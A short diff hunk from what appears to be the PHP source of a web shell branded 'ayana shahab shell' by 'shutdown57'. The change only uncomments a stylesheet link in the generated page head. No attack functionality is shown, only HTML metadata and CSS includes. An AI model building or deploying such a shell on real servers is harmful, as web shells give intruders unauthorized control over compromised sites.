@@ -165,7 +165,7 @@ $html_a.='
 <meta name="author" content="shutdown57">
 <meta name="keywords" content="shutdown57,ayana shahab shell">
 <meta name="description" content="ayana shahab shell c0ded  by shutdown57">
-<!--<link rel="stylesheet" href="http://www.w3schools.com/lib/w3.css">-->
+<link rel="stylesheet" href="http://www.w3schools.com/lib/w3.css">
 <link rel="stylesheet" href="w3.css">
 <link rel="stylesheet" href="http://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css">';
 $html_a.='</head><body onload="haposurl();"><style type="text/css">
